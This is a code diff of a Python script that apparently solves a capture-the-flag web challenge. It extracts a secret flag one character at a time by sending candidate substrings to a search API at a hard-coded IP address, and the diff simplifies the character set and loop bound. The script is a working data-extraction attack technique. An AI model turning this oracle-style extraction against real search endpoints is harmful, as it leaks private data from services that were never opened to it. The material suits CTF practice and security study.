@@ -2,8 +2,6 @@ import requests
 import string
 
 URL = "http://34.134.162.213:17000/api/search"
-FLAG_LENGTH = 24
-CHARS = "`~!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?" + string.digits + string.ascii_letters
 flag = "L3AK{"
 
 
@@ -29,13 +27,13 @@ def check_in_flag_post(substring):
 
 
 print("=== EXTRACTING FLAG ===")
-while len(flag) < FLAG_LENGTH:
-    print(f"\nCurrent flag: {flag} (length: {len(flag)} of {FLAG_LENGTH})")
+while len(flag) < 24:
+    print(f"\nCurrent flag: {flag} (length: {len(flag)} of 24)")
 
     test = flag[-2:]
     print(f"Testing {test} + ?")
 
-    for char in CHARS:
+    for char in string.printable:
         test_str = test + char
         if check_in_flag_post(test_str):
             print(f"Found valid char: {char}")
